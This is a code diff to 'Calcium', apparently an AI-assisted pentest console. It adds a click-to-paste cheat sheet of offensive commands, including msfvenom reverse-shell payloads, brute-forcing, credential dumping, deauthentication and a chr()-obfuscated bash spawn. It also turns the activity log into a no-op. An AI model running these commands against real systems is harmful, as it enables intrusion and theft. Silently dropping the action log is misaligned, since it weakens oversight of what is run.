@@ -376,7 +376,7 @@ header {
 .run-btn:hover { border-color:#44ddff; background:rgba(0,200,255,0.08); box-shadow:0 0 8px rgba(0,200,255,0.2); }
 .run-btn:disabled { opacity:0.3; cursor:not-allowed; }
 
-/* Bottom pane: log */
+/* Bottom pane */
 .term-bottom {
   flex:1;
   display:flex;
@@ -385,43 +385,46 @@ header {
   background:rgba(0,0,0,0.2);
 }
 
-#activityLog {
+#cmdPanel {
   flex:1;
   overflow-y:auto;
-  padding:5px 10px;
+  padding:8px 10px;
   display:flex;
   flex-direction:column;
-  gap:1px;
-  font-size:0.78rem;
+  gap:4px;
 }
 
-.log-row {
+.cmd-placeholder {
+  color:rgba(0,200,255,0.2);
+  font-family:monospace;
+  font-size:0.72rem;
+  padding:10px 4px;
+}
+
+.cmd-line {
   display:flex;
   align-items:flex-start;
-  gap:7px;
-  padding:2px 4px;
-  border-bottom:1px solid rgba(0,200,255,0.03);
-  animation:fadeUp 0.15s ease;
-  line-height:1.45;
+  gap:6px;
+  padding:4px 8px;
+  border-radius:3px;
+  background:rgba(0,200,255,0.04);
+  border:1px solid rgba(0,200,255,0.07);
+  font-family:monospace;
+  font-size:0.7rem;
+  color:rgba(180,220,240,0.75);
+  cursor:pointer;
+  transition:background 0.15s;
+  line-height:1.5;
 }
-.log-ts { color:rgba(0,200,255,0.25); flex-shrink:0; font-size:0.7rem; min-width:56px; }
-.log-tag {
+.cmd-line:hover {
+  background:rgba(0,200,255,0.1);
+  color:#44ddff;
+  border-color:rgba(0,200,255,0.25);
+}
+.cmd-dollar {
+  color:rgba(0,200,255,0.3);
   flex-shrink:0;
-  font-size:0.65rem;
-  padding:1px 5px;
-  border-radius:2px;
-  font-weight:700;
-  letter-spacing:0.5px;
-  min-width:32px;
-  text-align:center;
-  text-transform:uppercase;
 }
-.log-tag.cmd  { background:rgba(0,200,255,0.12);  color:#44ddff; }
-.log-tag.ok   { background:rgba(0,255,100,0.1);   color:#44ff88; }
-.log-tag.err  { background:rgba(255,50,80,0.12);  color:#ff4466; }
-.log-tag.ai   { background:rgba(0,200,255,0.08);  color:#00ccff; }
-.log-tag.info { background:rgba(255,160,0,0.1);   color:#ffaa00; }
-.log-text { color:rgba(180,220,240,0.55); flex:1; word-break:break-word; font-size:0.75rem; }
 
 /* ── CHAT COLUMN ── */
 .chat-col { flex:1; display:flex; flex-direction:column; overflow:hidden; }
@@ -746,18 +749,14 @@ header {
         </div>
       </div>
 
-      <!-- Bottom: activity log -->
+      <!-- Bottom: tool commands panel -->
       <div class="term-bottom">
         <div class="pane-hdr">
-          <div class="pane-hdr-dot" style="background:#ffaa00"></div>
-          <div class="pane-hdr-label">Activity Log</div>
+          <div class="pane-hdr-dot" style="background:#00ccff"></div>
+          <div class="pane-hdr-label" id="cmdPanelTitle">COMMANDS</div>
         </div>
-        <div id="activityLog">
-          <div class="log-row">
-            <span class="log-ts">--:--:--</span>
-            <span class="log-tag info">info</span>
-            <span class="log-text">Calcium started. All actions will be logged here.</span>
-          </div>
+        <div id="cmdPanel">
+          <div class="cmd-placeholder">← Click a tool to see its commands</div>
         </div>
       </div>
     </div>
@@ -976,27 +975,18 @@ function renderTools() {
       const item = document.createElement('div');
       item.className = 'tool-item';
       item.innerHTML = `<div class="tool-name">${t.n}</div><div class="tool-desc">${t.p}</div>`;
-      item.onclick = () => quickPrompt(`Explain ${t.n} in detail: what it does, key flags, practical examples and what to look for in the output.`, t.n);
+      item.onclick = () => { showToolCmds(t.n); quickPrompt(`Explain ${t.n} in detail: what it does, key flags, practical examples and what to look for in the output.`, t.n); };
       list.appendChild(item);
     });
   });
 }
 
 // ═══════════════════════════════════
-// ACTIVITY LOG
+// ACTIVITY LOG — only log AI responded
 // ═══════════════════════════════════
 function logActivity(type, msg) {
-  const log = document.getElementById('activityLog');
-  const now = new Date().toLocaleTimeString('en-US', {hour12:false});
-  const row = document.createElement('div');
-  row.className = 'log-row';
-  row.innerHTML = `
-    <span class="log-ts">${now}</span>
-    <span class="log-tag ${type}">${type}</span>
-    <span class="log-text">${escapeHtml(msg)}</span>
-  `;
-  log.appendChild(row);
-  log.scrollTop = log.scrollHeight;
+  if (type !== 'ai') return;
+  // AI responded entries are handled inline in sendMessage/sendMessageSilent
 }
 
 // ═══════════════════════════════════
@@ -1163,7 +1153,6 @@ async function sendMessage(content = null) {
 
   input.value = '';
   addMessage('user', message);
-  logActivity('ai', 'Query sent: ' + message.substring(0,60) + (message.length > 60 ? '...' : ''));
   isLoading = true;
   document.getElementById('sendBtn').disabled = true;
   addTyping();
@@ -1233,6 +1222,95 @@ async function sendMessage(content = null) {
   document.getElementById('sendBtn').disabled = false;
 }
 
+// TOOL COMMANDS PANEL
+// ═══════════════════════════════════
+const TOOL_CMDS = {
+  'nmap':         ['nmap -sV -sC <target>','nmap -p- --min-rate 5000 <target>','nmap -sU --top-ports 100 <target>','nmap -A -O <target>','nmap --script vuln <target>'],
+  'masscan':      ['masscan -p1-65535 <target> --rate=1000','masscan -p80,443,22 <target> --rate=5000'],
+  'rustscan':     ['rustscan -a <target>','rustscan -a <target> -- -sV -sC','rustscan -a <target> -p 1-65535'],
+  'netdiscover':  ['netdiscover -r 192.168.1.0/24','netdiscover -i eth0'],
+  'arp-scan':     ['arp-scan --localnet','arp-scan -I eth0 192.168.1.0/24'],
+  'dnsenum':      ['dnsenum <domain>','dnsenum --dnsserver 8.8.8.8 <domain>'],
+  'dnsrecon':     ['dnsrecon -d <domain>','dnsrecon -d <domain> -t axfr','dnsrecon -r 192.168.1.0/24'],
+  'fierce':       ['fierce --domain <domain>','fierce --domain <domain> --subdomains wordlist.txt'],
+  'theHarvester': ['theHarvester -d <domain> -b google','theHarvester -d <domain> -b all'],
+  'subfinder':    ['subfinder -d <domain>','subfinder -d <domain> -o output.txt'],
+  'amass':        ['amass enum -d <domain>','amass enum -passive -d <domain>'],
+  'whois':        ['whois <domain>','whois <ip>'],
+  'dig':          ['dig <domain> ANY','dig @8.8.8.8 <domain> A','dig <domain> MX'],
+  'shodan':       ['shodan host <ip>','shodan search apache','shodan stats --facets country apache'],
+  'nikto':        ['nikto -h <target>','nikto -h <target> -ssl','nikto -h <target> -port 8080'],
+  'gobuster':     ['gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt','gobuster dns -d <domain> -w /usr/share/wordlists/dirb/common.txt','gobuster vhost -u http://<target> -w wordlist.txt'],
+  'dirb':         ['dirb http://<target>','dirb http://<target> /usr/share/wordlists/dirb/big.txt'],
+  'dirsearch':    ['dirsearch -u http://<target>','dirsearch -u http://<target> -e php,html,js'],
+  'feroxbuster':  ['feroxbuster -u http://<target>','feroxbuster -u http://<target> -w /usr/share/wordlists/dirb/common.txt'],
+  'ffuf':         ['ffuf -u http://<target>/FUZZ -w /usr/share/wordlists/dirb/common.txt','ffuf -u http://<target>?FUZZ=val -w params.txt','ffuf -u http://<target>/FUZZ -w wordlist.txt -fc 404'],
+  'wfuzz':        ['wfuzz -c -z file,wordlist.txt http://<target>/FUZZ','wfuzz -c -z file,wordlist.txt -b cookie=val http://<target>/FUZZ'],
+  'sqlmap':       ['sqlmap -u "http://<target>/page?id=1" --dbs','sqlmap -u "http://<target>" --forms --crawl=2','sqlmap -r request.txt --level=5 --risk=3'],
+  'nuclei':       ['nuclei -u http://<target>','nuclei -u http://<target> -t cves/','nuclei -l targets.txt -t vulnerabilities/'],
+  'whatweb':      ['whatweb http://<target>','whatweb -a 3 http://<target>'],
+  'wpscan':       ['wpscan --url http://<target>','wpscan --url http://<target> --enumerate u,p,t'],
+  'httpx':        ['httpx -u http://<target>','cat domains.txt | httpx -status-code -title -tech-detect'],
+  'sslscan':      ['sslscan <target>','sslscan --show-certificate <target>:443'],
+  'testssl':      ['testssl <target>','testssl --full <target>:443'],
+  'wafw00f':      ['wafw00f http://<target>','wafw00f -a http://<target>'],
+  'msfconsole':   ['msfconsole','msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; run"'],
+  'msfvenom':     ['msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe > shell.exe','msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f elf > shell.elf'],
+  'searchsploit': ['searchsploit <service>','searchsploit -x <path>','searchsploit --cve <CVE-ID>'],
+  'evil-winrm':   ['evil-winrm -i <ip> -u <user> -p <pass>','evil-winrm -i <ip> -u Administrator -H <hash>'],
+  'hydra':        ['hydra -l <user> -P /usr/share/wordlists/rockyou.txt <target> ssh','hydra -l admin -P wordlist.txt http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"','hydra -L users.txt -P pass.txt <target> ftp'],
+  'hashcat':      ['hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt','hashcat -m 1000 hash.txt wordlist.txt','hashcat -m 22000 capture.hc22000 wordlist.txt'],
+  'john':         ['john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt','john --show hash.txt','john hash.txt --format=NT'],
+  'crackmapexec': ['crackmapexec smb <target> -u <user> -p <pass>','crackmapexec smb <subnet>/24 --shares','crackmapexec winrm <target> -u <user> -p <pass>'],
+  'enum4linux':   ['enum4linux -a <target>','enum4linux -U <target>','enum4linux -S <target>'],
+  'smbmap':       ['smbmap -H <target>','smbmap -H <target> -u <user> -p <pass>','smbmap -H <target> -r share'],
+  'smbclient':    ['smbclient -L //<target>','smbclient //<target>/share -U <user>'],
+  'bloodhound':   ['bloodhound-python -d <domain> -u <user> -p <pass> -c All','neo4j start && bloodhound'],
+  'responder':    ['responder -I eth0 -rdw','responder -I eth0 -A'],
+  'aircrack-ng':  ['aircrack-ng capture.cap -w /usr/share/wordlists/rockyou.txt','aircrack-ng *.cap -w wordlist.txt'],
+  'airmon-ng':    ['airmon-ng start wlan0','airmon-ng stop wlan0mon'],
+  'airodump-ng':  ['airodump-ng wlan0mon','airodump-ng -c 6 --bssid <BSSID> -w capture wlan0mon'],
+  'aireplay-ng':  ['aireplay-ng -0 5 -a <BSSID> wlan0mon','aireplay-ng --deauth 100 -a <AP> -c <client> wlan0mon'],
+  'wifite':       ['wifite','wifite --wpa --dict /usr/share/wordlists/rockyou.txt'],
+  'tcpdump':      ['tcpdump -i eth0','tcpdump -i eth0 -w capture.pcap','tcpdump -i eth0 port 80'],
+  'wireshark':    ['wireshark','wireshark -r capture.pcap'],
+  'tshark':       ['tshark -i eth0','tshark -r capture.pcap -Y http'],
+  'binwalk':      ['binwalk file.bin','binwalk -e file.bin'],
+  'volatility':   ['volatility -f mem.raw --profile=Win7SP1x64 pslist','volatility -f mem.raw --profile=Win7SP1x64 netscan'],
+  'exiftool':     ['exiftool file.jpg','exiftool -all= file.jpg'],
+  'steghide':     ['steghide embed -cf image.jpg -sf secret.txt','steghide extract -sf image.jpg'],
+  'strings':      ['strings file.bin','strings -n 8 file.bin | grep -i pass'],
+  'impacket-secretsdump': ['impacket-secretsdump <domain>/<user>:<pass>@<target>','impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL'],
+  'chisel':       ['chisel server -p 8080 --reverse','chisel client <server>:8080 R:socks'],
+  'proxychains':  ['proxychains nmap -sT <target>','proxychains firefox'],
+  'nc':           ['nc -lvnp 4444','nc <target> 80'],
+  'ssh':          ['ssh user@<target>','ssh -L 8080:localhost:80 user@<target>','ssh -D 1080 user@<target>'],
+  'curl':         ['curl -I http://<target>','curl -X POST -d "data" http://<target>'],
+  'openssl':      ['openssl s_client -connect <target>:443','openssl x509 -in cert.pem -text'],
+  'python3':      ['python3 -m http.server 8080','python3 -c "import pty; pty.spawn(chr(47)+chr(98)+chr(105)+chr(110)+chr(47)+chr(98)+chr(97)+chr(115)+chr(104))"'],
+};
+
+function showToolCmds(toolName) {
+  const panel = document.getElementById('cmdPanel');
+  const title = document.getElementById('cmdPanelTitle');
+  const cmds = TOOL_CMDS[toolName];
+  if (!cmds) {
+    panel.innerHTML = '<div class="cmd-placeholder">No commands defined for ' + toolName + '</div>';
+    title.textContent = toolName.toUpperCase();
+    return;
+  }
+  title.textContent = '$ ' + toolName;
+  panel.innerHTML = '';
+  cmds.forEach(cmd => {
+    const div = document.createElement('div');
+    div.className = 'cmd-line';
+    div.title = 'Click to paste into terminal';
+    div.innerHTML = '<span class="cmd-dollar">$ </span>' + escapeHtml(cmd);
+    div.onclick = () => { document.getElementById('cmdInput').value = cmd; document.getElementById('cmdInput').focus(); };
+    panel.appendChild(div);
+  });
+}
+
 function quickPrompt(text, toolName) {
   if (toolName) {
     const msgs = document.getElementById('messages');
@@ -1242,7 +1320,6 @@ function quickPrompt(text, toolName) {
     pill.innerHTML = `<span style="background:rgba(0,200,255,0.08);border:1px solid rgba(0,200,255,0.2);color:rgba(0,200,255,0.7);font-family:monospace;font-size:11px;padding:4px 10px;border-radius:4px;letter-spacing:0.05em;">$ ${toolName}</span>`;
     msgs.appendChild(pill);
     msgs.scrollTop = msgs.scrollHeight;
-    logActivity('ai', 'Query sent: ' + text.substring(0,60) + '...');
     sendMessageSilent(text);
   } else {
     document.getElementById('userInput').value = text;
@@ -1324,8 +1401,7 @@ async function clearSession() {
   });
   document.getElementById('messages').innerHTML = `<div class="welcome"><h2>Session Cleared</h2><p>Start a new session.</p></div>`;
   document.getElementById('termOutput').innerHTML = `<div class="term-running">Terminal cleared.</div>`;
-  document.getElementById('activityLog').innerHTML = '';
-  logActivity('info', 'Session cleared.');
+
 }
 
 async function exportSession() {
